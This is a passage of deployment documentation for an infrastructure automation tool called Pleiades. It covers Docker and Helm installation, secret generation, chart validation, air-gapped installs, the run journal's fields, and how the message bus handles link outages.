---
status: beta
---

# Running in production

This book covers what a real deployment needs to know before it runs Pleiades
against production infrastructure: what happens when something fails partway
through, what is checked before anything runs, how credentials and secrets are
handled, and what is genuinely built versus still design work. As with every page
in this reference, a claim here is either backed by real, tested code or is
explicitly marked otherwise; nothing below is aspirational.

## Installing

There are two supported ways to run the control plane: `docker-compose.yml` on a
single Docker host, and the Helm chart in `helm/the-pleiades` on Kubernetes.

On a Docker host it is one command, run from a checkout of this repository:

```bash
make up
```

The first time, that runs the controller's `setup` command in a one-shot
container on the stack's own network. Setup asks how long a link outage the
deployment must survive, generates the master encryption key and the JWT
secret, shows you the key once and has you type it back, writes both to `.env`
(which docker compose reads without being told to), and creates the first
administrator. After that, `make up` starts the stack. `.env` is then the only
copy of the key, so back it up; [Recovering from a lost key](#what-setup-tells-you-about-later)
below says what depends on it. Without a terminal (in a script),
`make up SETUP_FLAGS="--admin-email you@example.com --password-stdin"` reads the
administrator's password from standard input and asks nothing else.

`make backup`, `make restore`, `make down` and `make decom` cover the rest of the
stack's life; [Backup and restore](#backup-and-restore-data-retention-and-purge)
says what each keeps and removes.

The rest of this section is about the Helm chart. Everything below has been
rendered and checked; where something has not been run against a real cluster,
it says so.

### Nothing is published, so you build the images first

There is no registry hosting a Pleiades image and no tagged release of this
repository. That is the single most important fact about installing it, because
every other instruction follows from it.

Build both images from the commit you intend to run:

```bash
VCS_REF=$(git rev-parse HEAD)
docker build -f Dockerfile.controller --build-arg VCS_REF="$VCS_REF" -t pleiades/controller:dev .
docker build -f Dockerfile.runner     --build-arg VCS_REF="$VCS_REF" -t pleiades/runner:dev .
```

`VCS_REF` is the commit, and it reaches both the image's labels and the binaries,
which report themselves as `0.0.0-dev+<commit>` (`docker run --rm pleiades/runner:dev
/app/runner version`). A release is built the same way with `--build-arg VERSION=<release>` as
well; the binaries then report that release, and the Runner refuses an external
Collection program that states it needs a newer one. A `VERSION` that is not a release
number is ignored, so a build argument left at its default cannot pass for one.

`pleiades/controller:dev` and `pleiades/runner:dev` are the names the chart asks
for by default, and they are exactly what `docker compose build` produces, so a
locally built or side-loaded image is found with no extra flags. Push them to
your own registry and point `controller.image.repository` and
`runner.image.repository` there for anything beyond a first look.

If the images are missing, `helm install` still reports success. The failure
appears as `ImagePullBackOff` in `kubectl get pods` and, in more detail, in
`kubectl get events`. Check the pods, not the install command.

### Installing the chart

The chart needs a master encryption key, a JWT secret and a database password,
and will not invent any of them. The controller's `setup` command makes all
three in one step, as a Kubernetes Secret and a values file that points at it:

```bash
mkdir pleiades-install
go run ./cmd/controller setup --target helm --dir pleiades-install --namespace pleiades
kubectl create namespace pleiades
kubectl create --namespace pleiades -f pleiades-install/pleiades-secret.yaml
helm install pleiades ./helm/the-pleiades --namespace pleiades \
  -f pleiades-install/pleiades-values.yaml
```

With no Go toolchain, run the same command from the image you built above. The
log driver is off because at a terminal setup shows the key on screen, and a
container's output is otherwise kept by the Docker daemon:

```bash
docker run --rm -it --log-driver none --user "$(id -u):$(id -g)" \
  -v "$PWD/pleiades-install:/out" pleiades/controller:dev \
  /app/controller setup --target helm --dir /out --namespace pleiades
```

What the two files are:

- `pleiades-secret.yaml` holds the key, the JWT secret and the database
  password, at mode 0600, and is the only copy of the key. Keep it somewhere
  safe that is not this machine. Create it with `kubectl create`, not `apply`:
  `create` refuses to replace a Secret that already exists, and replacing the key
  of a release that stores data makes that data permanently unreadable.
- `pleiades-values.yaml` holds no secret. It names the Secret, sets the outage
  budget, and carries two values that keep guards the chart would otherwise lose
  with a Secret it did not create: a checksum of the Secret, so a new Secret
  restarts the pods, and a fingerprint of the database credentials, so a
  reinstall onto a volume created with a different password is refused (see
  [Reinstalling over a database that is still there](#reinstalling-over-a-database-that-is-still-there)).

Neither file puts a secret on a command line or into Helm's own release records,
which is where `--set` values go. Setup writes only new files: run it again over
the same directory and it refuses, naming the file it would have destroyed. It
counts nothing before an install, because no database exists yet; to change the
key of a release that stores data, rotate it (see
[Rotating the master key](#rotating-the-master-key)).

The chart will not generate these values itself, and that is deliberate. Helm can
produce a random value, but it would produce a *different* one on the next
`helm upgrade`, because `helm template` has no cluster to read the previous value
back from. A rotated `JWT_SECRET` rejects every API token signed with the old one,
which is annoying and recoverable; browser sign-ins do not use it. A
`MASTER_ENCRYPTION_KEY` replaced without keeping the old one makes every stored
credential and every encrypted device property permanently undecryptable, with no
error at upgrade time.

Supplying the values by hand still works: `secrets.masterEncryptionKey` (base64
of exactly 32 random bytes), `secrets.jwtSecret` (at least 32 bytes) and
`postgresql.auth.password` (characters that need no URL escaping), or a Secret you
manage yourself named in `secrets.existingSecret`. A Secret you manage yourself
restarts nothing when it changes and disables the reinstall check, unless you
also set `secrets.existingSecretChecksum` and
`postgresql.auth.existingSecretFingerprint` the way setup does.

Then create the first administrator, which is the real next step and the one the
install notes print:

```bash
kubectl exec -it deploy/pleiades-the-pleiades-controller -- \
  /app/controller bootstrap-admin --email you@example.com
```

What a default install gives you: one controller, two runners, and a
single-instance PostgreSQL and NATS deployed as part of the release. That is a
trial shape. For anything real, set `postgresql.enabled=false` and
`nats.enabled=false` and point `externalDatabase.dsn` and `externalNats.url` at
services somebody already knows how to back up and restrict. The in-chart broker
in particular runs with no authorization at all, and a dispatch payload carries
the credentials a job runs with.

The chart has no subchart dependencies, on purpose. PostgreSQL and NATS are
templated into it rather than pulled from a chart repository, so there is no
`helm dependency build` step and the whole chart is one directory. That is what
makes the air-gapped install below work.

### What setup tells you about later

`controller setup` is the one command that creates the secrets a deployment cannot
get back, so it says, at the moment it creates them, what depends on each one later.
This is the same text it prints, in more detail.

**The master encryption key** is required to read anything already stored, and
nothing regenerates it. A reinstall that restores it is a recovered system; a
reinstall without it is a new, empty one, and every credential, stored device
property and saved survey answer from before is unreadable for good. An upgrade
keeps it as it is. To change it safely, rotate it (see
[Rotating the master key](#rotating-the-master-key)); never replace it.

**The JWT secret** only has to be the same on every controller replica, or an API
token works on one and fails on another. Replacing it rejects every API token signed
with the old one until the token is signed again. Browser sign-ins do not use it and
are unaffected. It is not needed to read anything stored.

**The database** holds the work. It needs a backup of its own: the key cannot bring
back a database that is gone, and a backup cannot be read without the key. `make
backup` takes one, and keeps the key out of it; see
[Backup and restore](#backup-and-restore-data-retention-and-purge).

**The outage budget** is the one question setup asks: *what is the longest link
outage this deployment must survive?* The broker keeps every message for 336 times
the answer, so the default of 30 minutes keeps 7 days and the 12 hour ceiling keeps
168 days. Dispatch messages carry the credentials their jobs run with, so those stay
on the broker as long. The broker's duplicate detection stops at 5 minutes and does
not grow with a larger answer. Raising the budget later is free. Lowering it discards
messages older than the new window, so the controller refuses to lower it while it
holds such messages, until you set `PLEIADES_MAX_OUTAGE_ALLOW_DISCARD=true` for that
one start. See [One number sets how long an outage may last](#one-number-sets-how-long-an-outage-may-last).

#### What setup refuses, and the guard on each setting

| Setting | What getting it wrong costs | What changing it takes |
|---|---|---|
| `MASTER_ENCRYPTION_KEY` | Everything encrypted under it is unreadable for good | `--destroy-existing-encryption-key` and, at a terminal, typing `destroy <fingerprint>`. Refused outright while any stored row is encrypted under the key, and refused if setup cannot reach the database to count |
| `PLEIADES_MAX_OUTAGE` | Lowering it discards broker messages | `--max-outage <duration> --force` |
| `JWT_SECRET` | API tokens signed with the old one stop working | `--new-jwt-secret --force` |
| The database password (Helm) | The controller cannot connect until it is put back | Written once, never regenerated |

Run again with nothing to change, setup refuses and names the file it would have
destroyed. Before writing a key it counts, in the database the controller uses, every
row sealed under any master key, and tries each one against the keys it holds:

- A **first** key is refused if the database already holds encrypted rows. A new key
  opens none of them, and the key that does is somewhere setup cannot see: most
  often a `.env` that was deleted while the database volume was kept. The refusal
  counts them by kind, says whether they are under the key earlier versions of
  `docker-compose.yml` published (which is public, so that data is readable by
  anyone who has that file), and names both ways out.
- A **replacement** is refused while any row opens under the key being replaced, or
  under the previous key during a rotation. The flag does not override this: a key
  that protects data is changed by rotating it.

It reads the database without migrating it, and a database it cannot reach, or stops
reaching partway through, is a refusal rather than a count of zero.

#### The possession check, and what it does not prove

At a terminal, setup shows a new key once on the terminal's alternate screen, then
leaves that screen and clears the scrollback, and asks you to type or paste the key
back. It is written to disk only after that.

Re-entering the key proves one thing: you held an exact copy a moment ago. It cannot
show where that copy is or that it will last, and a paste from a clipboard passes it.
Setup says so in those words. Without a terminal it shows the key to nobody, runs no
check, and says that the file is the only copy.

While the key is on screen, Ctrl+C does not stop setup straight away, because in most terminals
it is the key for stop rather than copy and it is what people press to copy the key. The first
one says so and keeps the key on screen; a second one stops setup, which writes nothing.

Clearing the screen does not reach everything that saw it. `tmux` and `screen` keep
their own history, and `script`, `asciinema` and any other terminal recorder keep
whatever was on screen. And a terminal echoes what you type the moment it arrives,
so a key pasted before the hidden prompt appears is echoed.

#### When the key came into existence

The activity trail records a key by its fingerprint, never by its value, the moment
setup generates it: `controller-setup created encryption key 3f9a-c21b (generated by
setup, possession checked)`. A key generated where no database was reachable, which is
every Helm install, is recorded by the first controller to start with it, as `first
used by this database`. The fingerprint is not a secret: it cannot be turned back into
the key, and anyone who could test a guessed key against it could test it just as
well against the ciphertext it protects, which sits in the same database.

### What the chart refuses to install

Some configurations are refused at render time, with the reason in the error,
rather than installing cleanly and behaving wrongly later:

| Configuration | Why it is refused |
|---|---|
| `runner.playbookDir` or `runner.ansibleImage` | The legacy Ansible path runs a playbook by starting a **sibling container through a Docker daemon**. A pod has no Docker daemon. The two ways to give it one are mounting the node's container runtime socket (which hands the pod control of every container on that node) or a privileged Docker-in-Docker sidecar (the same authority in a different shape). Run unconverted playbooks on a Docker host with `docker-compose.yml` instead. |
| `controller.tls.mode=self-provisioned` with more than one replica **and `controller.persistence.enabled=false`** | Several self-provisioning controllers sharing one directory are fine: provisioning is lock-free, none of them waits on another, and the directory converges on one certificate. With persistence off there is no shared directory at all: each replica's `/data` is its own `emptyDir`, so each mints its own certificate and a new one on every restart, and there is nothing to converge on. Share a directory with `persistence.accessMode=ReadWriteMany`, or scale out with `mode=secret` or `mode=upstream`. |
| More than one controller replica over a `ReadWriteOnce` or `ReadWriteOncePod` volume | The chart creates one claim, not one per replica, because a Deployment has no `volumeClaimTemplates`. A second replica scheduled on another node would sit `Pending` forever. `ReadWriteMany` is the only access mode that serves more than one replica; the alternatives are turning persistence off or staying at one replica. |
| An image tagged `latest`, untagged, or pinned by digest | `latest` names a different image tomorrow. A digest does not resolve against a side-loaded image, which breaks exactly the air-gapped install below. |
| A missing encryption key, JWT secret, or database password | See above. |
| A mistyped values key | `values.schema.json` sets `additionalProperties: false`, so `controller.replicaCounts=3` is an error instead of a silently ignored setting that leaves the default in place. |
| An enabled `podDisruptionBudget` that sets both `minAvailable` and `maxUnavailable`, or neither | A PodDisruptionBudget carries one or the other, and the API server rejects an object with both. Setting neither used to render no budget at all, so an operator who believed disruption protection was on had none and nothing said so. Note that `0` counts as an answer on either field: `minAvailable: 0` permits every voluntary eviction and `maxUnavailable: 0` permits none. |
| An `ingress.hosts[].paths[]` entry with no `pathType` | `networking.k8s.io/v1` requires `pathType` on every path, so an entry without one produces an object the API server refuses. The schema requires the key and the template also defaults it to `Prefix`. |
| Installing over a retained database volume with different credentials | See [Reinstalling over a database that is still there](#reinstalling-over-a-database-that-is-still-there) below. This is the one refusal that reads the cluster, so it fires on a real `helm install` or `helm upgrade` and not during `helm template`. |

`make helm-lint` is the gate that keeps these true. It renders the chart in five
arrangements, checks that every rendered container has a numeric non-root uid, a
read-only root filesystem, no capabilities, the default seccomp profile, no
`hostPath` volume and no `latest` tag or digest, and then checks that each
refusal above really fires with its reason intact. It needs Helm 4 and no
cluster.

It also renders the chart at **release-name lengths 1, 20, 30, 31, 40, 44, 48,
49, 50, 52 and 53** (twice at each length, since a name containing
`the-pleiades` takes a different branch of the naming helper, and the two
branches cross these boundaries at different points) and requires every object
name to stay
distinct, to keep its component word, and to be legal **for its own kind**.
Neither half is hypothetical, and they were two different bugs.

A release name of 49 to 53 characters, every one of them legal to Helm, used to
truncate the controller, the runner, the PostgreSQL StatefulSet and the NATS
StatefulSet to **one identical name**, so the objects overwrote each other on
apply. Names are now built by cutting the release-scoped prefix first and
appending the component second, so a long release name loses characters from a
part nobody reads.

The fix for that held every kind to 63 characters, which is right for a Service
and 11 characters too generous for a StatefulSet. Kubernetes labels each
StatefulSet pod with `controller-revision-hash`, whose value is
`<statefulset name>-<hash>` and which may not exceed 63 bytes, so a longer
StatefulSet name is **created successfully and then produces no pods at all**:
`helm install` reports success, the object sits at `0/1` forever, and the only
evidence is a `FailedCreate` event. Verified against a real cluster in both
directions. The two StatefulSets therefore get a lower budget than the two
Deployments, and the linter now asserts the names Kubernetes *derives* from
each object name as well as the names the chart writes.

**One container is exempt from the probe rule, by name and with a written
reason: the runner.** It has no liveness or readiness probe because there is
nothing inside the pod to ask. `cmd/runner` binds no port, has no HTTP surface
and no `healthcheck` subcommand, and its image is distroless, so it carries no
shell and no `curl`. The one executable in the image is the runner binary
itself, and it treats any first argument it does not recognise as an ordinary
start, so an `exec` probe running it would launch a **second runner agent into
the consumer group every few seconds**. There is no probe a chart can express
that would help here.

Its real liveness question is whether it is still pulling from its durable NATS
consumer, which is a fact about a connection held inside the process. The
practical consequence for an operator: **Kubernetes cannot tell a wedged runner
from a working one.** A runner that is up but has stopped consuming looks
healthy. Watch for it on the controller side instead, as a job that stays queued
with no runner claiming it, or on the broker as a climbing pending count.

Closing that gap needs a `healthcheck` subcommand on the binary, in the shape
`cmd/controller/healthcheck.go` already has, not a chart change. The waiver
carries that condition rather than only the reason: `make helm-lint` re-reads
`cmd/runner` on every run and fails, with the chart edit spelled out, the day a
healthcheck subcommand appears there. Every other container is required to carry
both probes, on different endpoints, and a new one arriving without them fails
the build.

### Verifying what you are about to install

Be clear about what verification is available today, because it is less than a
mature project offers:

**There is no signed release.** No git tags exist, so there is nothing to sign,
no published checksums, no cosign signature, no SBOM, and no provenance
attestation. Anyone telling you they downloaded a Pleiades release verified it
against nothing.

What you can do instead:

1. **Build from a commit you chose.** The images carry OCI labels, so a built
   image records where it came from: `docker inspect -f '{{json .Config.Labels}}'
   pleiades/controller:dev` prints `org.opencontainers.image.revision`. A build
   that passed no `--build-arg VCS_REF` stamps `unknown`, which is honest and
   useless, so pass it.
2. **Record the image ID you built** (`docker image inspect -f '{{.Id}}'
   pleiades/controller:dev`) and compare it with what actually landed on the
   node (`crictl images --digests`, or `kubectl describe pod` for the resolved
   image). This is what catches a stale side-load, which is the realistic
   failure here rather than a supply-chain attack.
3. **Render before you install.** `helm template` needs no cluster:

   ```bash
   helm template pleiades ./helm/the-pleiades --set ... | kubectl apply --dry-run=client -f -
   ```

   That parses every object and catches a values mistake before anything runs.
   With a cluster you can reach, `--dry-run=server` is strictly better: the API
   server itself validates the manifests, so a required field the client-side
   parse cannot know about (an Ingress path with no `pathType`, a
   PodDisruptionBudget carrying two budget fields) is reported by the thing that
   would have rejected it.

### Reinstalling over a database that is still there

`helm uninstall` does **not** delete the PostgreSQL data volume, and that is
deliberate: the claim is created by a StatefulSet `volumeClaimTemplate`, which
Kubernetes leaves behind on purpose, and a chart that destroyed a database on
uninstall would be the more dangerous chart. So a reinstall under the same
release name lands on a volume that already holds an initialized database.

PostgreSQL applies `POSTGRES_USER`, `POSTGRES_DB` and `POSTGRES_PASSWORD` **only
when it initializes an empty data directory**. Against a volume that already
holds a database it ignores all three. A reinstall with a different password
therefore used to install cleanly, report every object created, bring the
database up healthy, and leave the controller failing authentication and
crash-looping forever with nothing anywhere naming the cause.

The chart now refuses that. The StatefulSet stamps a hash of the three
credentials onto its `volumeClaimTemplate`, Kubernetes copies it onto the claim,
and the claim outlives the release, so the next install compares and stops. The
refusal names the claim and both real choices:

- **Keep the data.** Install with the `postgresql.auth` values that volume was
  created with. Nothing is destroyed.
- **Start over.** `kubectl delete pvc <claim> --namespace <namespace>`, then
  install. **This destroys the database**: every user, device, template, job,
  credential and role binding in it. There is no undo and this chart takes no
  backups.

Two boundaries worth stating. The check needs a cluster to read, so it is silent
under `helm template` and `--dry-run=client` and fires on a real `helm install`,
`helm upgrade` or `--dry-run=server`. And it refuses only a **proven** mismatch:
a claim this chart did not create carries no stamp, and with
`secrets.existingSecret` the chart never sees the password, so it compares the
`postgresql.auth.existingSecretFingerprint` setup writes instead. A Secret you
made by hand without one gives the chart no evidence, and it does not guess. `tests/e2e/packaging_kind_test.go` proves the whole sequence
against a real cluster: install, uninstall, reinstall with a changed password
(refused, with the claim named), then reinstall with the original one
(accepted).

### Air-gapped install

The chart is built to install with no route to the internet. The sequence:

```bash
# On a connected machine.
docker build -f Dockerfile.controller -t pleiades/controller:dev .
docker build -f Dockerfile.runner     -t pleiades/runner:dev .
docker save pleiades/controller:dev pleiades/runner:dev -o pleiades-images.tar
helm package ./helm/the-pleiades          # produces the-pleiades-0.1.0.tgz

# Move pleiades-images.tar and the-pleiades-0.1.0.tgz across.

# On each node that will run a Pleiades pod (containerd):
ctr -n k8s.io images import pleiades-images.tar
# or, for a kind cluster:
kind load image-archive pleiades-images.tar

# setup needs no network either: run it from the image, as above.
docker run --rm -it --log-driver none --user "$(id -u):$(id -g)" \
  -v "$PWD/pleiades-install:/out" pleiades/controller:dev \
  /app/controller setup --target helm --dir /out --namespace pleiades
kubectl create --namespace pleiades -f pleiades-install/pleiades-secret.yaml
helm install pleiades ./the-pleiades-0.1.0.tgz --namespace pleiades \
  -f pleiades-install/pleiades-values.yaml
```

Three things make that work, and each of them is a decision that can be undone
by accident:

- **The images are referenced by tag, never by digest.** A digest-pinned
  reference does not resolve against a side-loaded image, even when the local
  daemon reports that exact digest. Digest pinning is normally the stronger
  practice, and here it breaks every air-gapped, side-loaded and kind-based
  install. The chart refuses a digest for that reason.
- **`imagePullPolicy` is `IfNotPresent`.** Setting it to `Always` forces a pull
  that cannot succeed, no matter what is already on the node.
- **The chart has no dependencies**, so nothing needs a chart repository.

You also need the two backend images (`postgres:15.19-alpine` and
`nats:2.14.4-alpine`) in the same archive if you are using the in-chart
database and broker, since they are pulled the same way everything else is.

**Verified against a real cluster, with a stated boundary.**
`tests/e2e/packaging_kind_test.go` performs this whole sequence on every
integration run: it creates a single-node kind cluster at a pinned Kubernetes
version, side-loads both locally built images into the node's containerd store,
installs this chart with `imagePullPolicy=Never` so a missing side-load fails
loudly instead of being quietly pulled, and then proves the controller
Deployment reaches `Available`, that `/readyz` answers
`{"status":"ready","checks":{"database":"ok","nats":"ok"}}` over the certificate
the controller provisioned for itself, and that `bootstrap-admin` works through
`kubectl exec`.

What that does NOT cover, so nobody reads more into it than it carries: one
node, so nothing about scheduling across nodes, `ReadWriteMany` volumes or a
real StorageClass is exercised; the two backend images are pulled from the
registry rather than side-loaded, because a multi-architecture image cannot be
side-loaded into a kind node, so a genuinely air-gapped install of PostgreSQL
and NATS is still the carefully constructed sequence above rather than a
transcript; and no Ingress, no cert-manager and no external database are
installed. The chart also renders in five arrangements under `make helm-lint`,
passes `helm lint --strict`, and every object it produces is accepted by
`kubectl apply --dry-run=server`, which is the API server's own validation
rather than a client-side parse.

## Failure semantics and safety

### A command is never retried once sent

The Crawl-tier CLI's real SSH transport (`internal/transport/ssh`) retries with
backoff and jitter, and short-circuits through a per-target circuit breaker, but
**only during the dial phase**: establishing the TCP connection and completing the
SSH handshake. The moment a command has actually been sent to the remote side, it
is never retried, for a specific reason: a command may have partially executed
remotely already, and blindly retrying it could re-apply an unknown side effect
(delete a file twice, restart a service twice, and so on). A connection lost
mid-session is reported as a genuine error, never silently retried and never folded
into a fabricated exit code.

Practically, this means: a dial failure (device unreachable, port closed, auth
rejected) is retried automatically up to a bounded limit before it is reported as an
error. A failure *after* the command was sent (the connection drops mid-run, the
device reboots unexpectedly) is reported as an error immediately, and it is the
caller's job to determine what state the device was left in and re-run explicitly
once that is known, not Pleiades' job to guess.

That is true of one command. It is not yet true of a whole run on the Controller: a
dispatched run that fails, for any reason including one failed task, is delivered to a
Runner again, up to five deliveries in all, and each delivery runs the definition from
the start. See [the dispatch section of Control plane and
API](09-control-plane-and-api.md#what-a-runner-does-with-a-dispatch) before relying on a
definition that is not safe to repeat. This is planned to become a stated policy that is
off by default.

### Every task execution is recorded in a run journal

Every node a run executes leaves a durable record: what ran, against which device,
in what order, how long it took, whether it changed anything, and if it failed, at
which stage. On the Crawl tier that is one append-only JSON Lines file per run at
`<project>/.pleiades/journal/<run-id>.jsonl`, written `0600` inside a `0700`
directory. On the Walk tier the Runner publishes each level onto the job's own
subject and the Controller stores it in the `journal_entries` table, keyed by the
job, the device, the delivery attempt and the graph node, so a redelivered dispatch
reads as a retry rather than as two unrelated runs.

**The journal stores no value that came back from a device.** It is not masked,
because there is nothing in it to mask: it holds identifiers the platform generated,
method names resolved through the collection registry at write time, the parameter
and return key NAMES a method's own documentation declares, closed status values,
a content hash of the compiled runbook, the labels the runbook author wrote, and
counts. It records that a task produced a `stdout`; it does not record what the
device wrote there. Two consequences follow and both matter in practice:

- It is an audit and control-flow artifact, not a diagnostic one. It cannot answer
  what the device actually said. `--verbose` still can.
- It needs no key and nothing decrypts it, on either tier.

The one channel that does carry human-written text is the labels: a task's `name:`,
its `register:` and the runbook's `id:` are stored as written. So the honest
guarantee is "no value the platform obtained", not "no secret a person could type
into a task name".

### What one journal record contains

A Crawl-tier journal file is JSON Lines: one record per line, one line per node
the run reached, per device it ran against. A node the run never reached, because
an earlier task failed, has no record at all. The order is the graph's, not the clock's: level by level, and
within a level in graph position. Nodes in a level really do run at the same time
and can finish in any order, so if you need wall-clock order, sort on
`finished_at`; `sequence` gives you run order. Any tool that reads JSON will read
the file, so `jq` is usually enough:

```bash
# every task that changed something, across every run on disk
jq -r 'select(.outcome == "changed") | "\(.task_name)\t\(.fqcn)\t\(.device_id)"' \
  .pleiades/journal/*.jsonl
```

The Walk tier stores the same fields as columns in `journal_entries`.

**Identifiers**

| Field | Meaning |
|---|---|
| `run_id` | One `Executor.Run` call. Names the Crawl-tier file. |
| `sequence` | Order within that run. A level runs concurrently, so two records can share an instant; this cannot tie. |
| `node_id` | Position in the compiled graph, such as `tasks[0]`. Not the task's `register:` name. |
| `device_id` | The inventory item's stored id. Never a device property. A node that resolved no device, a skipped task or a controller-side one, names the Walk-tier dispatch's own device, because a dispatch runs against exactly one. On the Crawl tier the same node leaves it empty: one run there spans every device the task targets, and the skip was decided once for all of them. |
| `job_id`, `attempt` | The Walk-tier dispatch and its redelivery count. Both empty or zero on the Crawl tier, which has no dispatch. |
| `started_at`, `finished_at` | UTC, bounding this one execution. |

**What ran**

| Field | Meaning |
|---|---|
| `fqcn` | The method, resolved through the collection registry when the record was written. Never the raw text from the runbook. |
| `fqcn_unresolved` | True when the registry knew no such method, in which case `fqcn` reads `unregistered`. |
| `provider_program`, `provider_digest` | For a method an external Collection program provides, that program's path and the SHA-256 digest it ran as. Both are empty for a method built into Pleiades. |
| `dag_id` | The runbook's own `id:`, as written. |
| `dag_version` | A `sha256:` hash of the compiled runbook, for detecting drift between what ran and what is on disk now. It cannot recover the runbook. |
| `task_name`, `register` | The author's own `name:` and `register:`, as written. These are the only fields carrying free text a person typed. |

**How it ended**

| Field | Meaning |
|---|---|
| `outcome` | One of `ran`, `changed`, `skipped`, `failed`, `not_reached`. The first four read as they sound. `not_reached` is the record of a parallel group's own fan-out marker, which carries no method, no device and no timings because it executes nothing itself; despite the name it is never a task an earlier failure stopped the run short of, since those leave no record at all. |
| `failure_stage` | Where a failure happened, read off control flow rather than parsed from an error: `workflow_read`, `condition_eval`, `secret_mask`, `resolve_target`, `lock_all`, `lock_device`, `action`, `register_mask`, `record`. Empty unless `outcome` is `failed`. |
| `skip_kind` | Which gate skipped the task: `when`, `when_or`, `when_cel` or `lifecycle`. Empty unless `outcome` is `skipped`. |
| `skip_ordinal`, `skip_total` | Which condition of how many decided a `when` skip. The ordinal is zero for `when_or`, where every condition had to be false and none is the actionable one. |

Note what is absent: there is no error message field. A failure records the stage it
happened at and nothing the device or the platform said about it, because that text
is the one place a device's own output reliably ends up.

**Key names and counts**

These record which keys a task produced or consumed, never their values.

| Field | Meaning |
|---|---|
| `stat_keys` | Return key names the method's own documentation declares, plus the two platform keys `inverse` and `diff`. |
| `param_keys` | Parameter names the method declares. |
| `undeclared_stat_count`, `undeclared_param_count` | How many keys were rejected because the registry does not declare them. Counted rather than named, so an undeclared key cannot smuggle text in through its own name. |
| `inverse_fqcn`, `inverse_param_keys` | The method that would reverse this task, and the names of the parameters such a call takes. Not their values, which is why nothing replays automatically. |
| `inverse_fqcn_unresolved` | True when that reversing method is not in the registry. |
| `undeclared_inverse_param_count` | The same counter, for the reversing call. |
| `diff_recorded` | Whether the task recorded a before and after. Not the before or the after. |

### Rollback is authored, not inferred

The journal records the concrete instruction that would reverse a task that changed
something: the method to call and the names of the parameters such a call takes. It
does not record their values, so nothing can replay it automatically, and nothing
in Pleiades performs a rollback today. Undoing a partial run is an authored
runbook you write and run deliberately, with the journal as the record of what
actually happened and therefore of what needs undoing.

### The message bus survives a link outage of any length

**This section is about the control plane only, and the distinction is the whole
point of reading it.** Pleiades has two independent network planes:

- The **control plane** is Controller to NATS to Runner: dispatches out, logs and
  results back, device leases held. Everything below is about that link.
- The **execution plane** is Runner to device: SSH, serial, WinRM. Its resilience
  rules are different and are described in the section above. A command already
  sent to a device is never retried, whatever the network does.

Nothing here makes a session to a device survive anything. What it makes survivable
is a Runner losing contact with the Controller, which in an edge deployment (the
Runner at the far end of a satellite or radio link, the Controller at the teleport)
is the link most likely to disappear. If your Runner sits in the datacentre and
reaches devices over the bad link, this section does not help you; the execution
plane's dial-phase retry and circuit breaker are what apply.

Every connection the Controller and Runner open to NATS is configured from one
place, and that configuration is built for a link that disappears rather than a
datacentre LAN. Three properties matter operationally.

**Reconnection is unlimited.** A connection that drops keeps trying to come back
for as long as the process is running, with exponential backoff between attempts
(250ms growing to a 30s ceiling). There is no outage length at which a process
gives up and needs a manual restart. This was not always true: before this
behaviour was added, an outage longer than roughly two minutes closed the
connection permanently, and the process stayed running and looked healthy while
doing no work at all.

**Startup does not require the broker to exist yet.** A Controller or Runner
started before NATS is reachable waits up to ten seconds for it rather than
exiting immediately. Past that it does exit, and its supervisor restarts it
(Kubernetes `restartPolicy`, compose `restart`), so a slow broker still converges
without you ordering the three services, it just converges by restart. The bound
is what keeps a wrong `NATS_URL` a startup failure with a clear error rather than
a hang.

**Connection events are logged.** A lost connection logs at WARN, a recovery logs
at INFO with the reconnect count, and asynchronous errors log at ERROR, all tagged
with the component that owns the connection (`event-bus`, `lock-manager`,
`runner-dispatch`, `controller-logstream`). A Runner opens three connections and
they are named separately on the server, so `nats server report connections`
distinguishes them.

What this does **not** change: a job already running on a device when the link
drops is still subject to the device lease expiring, and a command already sent is
still never retried (above). Surviving the outage means the Runner comes back and
keeps pulling work, not that in-flight work is resumed where it stopped.

### One number sets how long an outage may last

You state one thing, and everything retention-shaped is derived from it:

```
PLEIADES_MAX_OUTAGE=30m          # env, on the controller AND the runner
mesh.maxOutageSeconds: 1800      # the Helm equivalent
```

Thirty minutes is the default. The accepted range is one minute to twelve hours.
Set the same value on every service: they each derive the stream's retention from
it, and a service whose value differs logs a warning naming the mismatch on every
start.

What it derives: how long the stream keeps a message, how long the broker
remembers a message identity for duplicate suppression, and how long a runner
remembers that it already executed a piece of work. Before this, those were three
unrelated numbers that happened to sit near each other, and two of them sat three
seconds apart by pure coincidence.

**Raising it is safe. Lowering it is not always.** Retention is derived from the
budget, so shortening the budget shortens retention, and shortening retention
deletes every message already older than the new value. The controller refuses to
do that. It tells you how many messages it would delete and how old the oldest is,
and you either raise the budget or set
`PLEIADES_MAX_OUTAGE_ALLOW_DISCARD=true` to accept the deletion. Note also that a
dispatch message carries the credentials its job runs with, so a longer retention
means those sit on the broker for longer: raising the budget is free in terms of
message loss and is not free in terms of exposure.

**The Helm chart now refuses to install a budget it would cancel.** The runner's
liveness probe restarts the pod when its heartbeat goes stale, and that restart
abandons in-flight work, so a staleness limit shorter than the budget means
Kubernetes kills the runner partway through the outage the budget claims to
survive. `runner.heartbeat.livenessStaleAfterSeconds` now defaults to the same
1800 seconds, and the chart fails the install if you make it shorter than
`mesh.maxOutageSeconds`. The cost of that is real and worth knowing: a runner
wedged for a reason reconnection cannot fix now takes up to the budget to be
noticed and restarted, where it used to take about a minute.

**What the budget does not fix.** Two things still cut an outage shorter than the
budget, and neither is a retention setting. A runner cannot begin new work during
an outage at all, because starting a job publishes a log event first. And a job
already running on a device is abandoned about a minute into an outage, when the
device lease heartbeat fails. So the honest reading is that the budget governs how
long the fleet can be out of contact and still pick up where it left off, not how
long work already in progress keeps running.

**The bus can be authenticated, and is not by default.** Reconnection resilience
is not security. Until you turn authentication on, any client that can reach the
broker can publish and subscribe, and a dispatch message carries the credentials
its job runs with. Restrict network access to the broker accordingly.

Turning it on is [Mesh identity](#mesh-identity-authenticating-the-bus) below. It
is off by default so that an existing deployment upgrades without changing
anything, not because it is unfinished.

### Only the controller changes the message stream's shape

The controller, the runners and the demo binary all connect to the same JetStream
stream and the same key-value bucket for device locks. Only the **controller** ever
changes their configuration. Every other service binds to whatever is already
there.

This matters the moment you tune anything. Retention, the duplicate window and the
replica count used to be re-applied by every service on every start from values
compiled into that particular binary, so a setting you changed by hand was silently
reverted by the next runner restart, with nothing logged. A runner has no code path
that rewrites a live stream any more, so it cannot do that.

**You still do not need to order your services.** A service that finds the stream or
the bucket missing creates it, so a fresh install works whichever process starts
first, and a stream lost to a disk failure comes back on its own without waiting for
a controller restart. What changed is only the ability to *reshape* something that
already exists, not the ability to create what is absent.

**A mismatch is a warning, not a refusal.** During a rolling upgrade you will
briefly have services whose builds expect different settings. Any service that finds
